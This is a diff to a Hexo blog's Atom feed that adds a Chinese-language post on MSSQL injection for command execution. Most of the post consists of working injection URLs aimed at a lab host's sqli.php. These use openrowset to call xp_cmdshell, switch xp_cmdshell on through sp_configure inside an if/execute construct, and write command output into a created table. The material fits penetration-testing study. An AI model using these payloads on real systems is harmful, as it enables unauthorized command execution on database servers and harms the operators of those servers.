@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-06-25T05:55:45.651Z</updated>
+  <updated>2021-06-25T11:41:37.523Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>mssql注入突破堆叠来执行命令</title>
+    <link href="http://example.com/2021/06/25/mssql/"/>
+    <id>http://example.com/2021/06/25/mssql/</id>
+    <published>2021-06-25T11:31:41.000Z</published>
+    <updated>2021-06-25T11:41:37.523Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>1、利用openrowset，适用于union和报错注入： 但是该方法在实际的运用中局限性还是很大的，因为在 mssql2005 及其以后，mssql对系统存储过程做了权限控制，Ad Hoc Distributed Queries 组件默认是不被启用的。</strong><br><code>http://192.168.31.89/sqli.php?id=-1 union select (select * from openrowset(&#39;sqloledb&#39;,&#39;dsn=locaserver;trusted_connection=yes&#39;,&#39;set fmtonly off exec master..xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;) for xml path),null,null</code><br><img src="/2021/06/25/mssql/1.jpg" class="lazyload" data-srcset="/2021/06/25/mssql/1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1"></p><p><code>http://192.168.31.89/sqli.php?id=-1 AND (select * from openrowset(&#39;sqloledb&#39;,&#39;dsn=locaserver;trusted_connection=yes&#39;,&#39;set fmtonly off exec master..xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;) FOR XML PATH(&#39;&#39;))=1</code></p><p><code>http://192.168.31.89/sqli.php?id=-1 and 1=(select * from openrowset(&#39;sqloledb&#39;,&#39;dsn=locaserver;trusted_connection=yes&#39;,&#39;set fmtonly off exec master..xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;) for xml path)</code><br><img src="/2021/06/25/mssql/2.jpg" class="lazyload" data-srcset="/2021/06/25/mssql/2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="2"></p><p><strong>2、如果能构造一个if语句则可以用：这个更好利用：几乎没限制，但前提是要知道怎么构造if语句。这里可以开启存储过程，接下来的就可以自由发挥了</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 <span class="built_in">where</span> 1=1 <span class="keyword">if</span> 1=1 execute(<span class="string">&#x27;exec sp_configure &#x27;</span><span class="string">&#x27;show advanced options&#x27;</span><span class="string">&#x27;, 1;reconfigure;exec sp_configure &#x27;</span><span class="string">&#x27;xp_cmdshell&#x27;</span><span class="string">&#x27;, 1;reconfigure;exec xp_cmdshell &#x27;</span><span class="string">&#x27;whoami&#x27;</span><span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure><p><code>http://192.168.31.89/sqli.php?id=-1 if 1=1 execute(&#39;exec sp_configure &#39;&#39;show advanced options&#39;&#39;,1;reconfigure;exec sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1;reconfigure;exec xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;)</code><br>可以结合创建一个表来读取命令的执行结果的方法：<br><code>http://192.168.31.89/sqli.php?id=-1 if 1=1 execute(&#39;exec sp_configure &#39;&#39;show advanced options&#39;&#39;,1;reconfigure;exec sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1;reconfigure;CREATE TABLE tmp (dir varchar(8000));insert into tmp(dir) exec xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;)</code><br><img src="/2021/06/25/mssql/3.jpg" class="lazyload" data-srcset="/2021/06/25/mssql/3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="3"></p><p><img src="/2021/06/25/mssql/4.jpg" class="lazyload" data-srcset="/2021/06/25/mssql/4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="4"></p><p><img src="/2021/06/25/mssql/5.jpg" class="lazyload" data-srcset="/2021/06/25/mssql/5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="5"></p>]]></content>
+    
+    
+    <summary type="html">mssql注入突破堆叠</summary>
+    
+    
+    
+    <category term="web安全" scheme="http://example.com/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+    <category term="mssql注入" scheme="http://example.com/tags/mssql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>sqlserver注入:执行命令和写入exe的一些方法技巧</title>
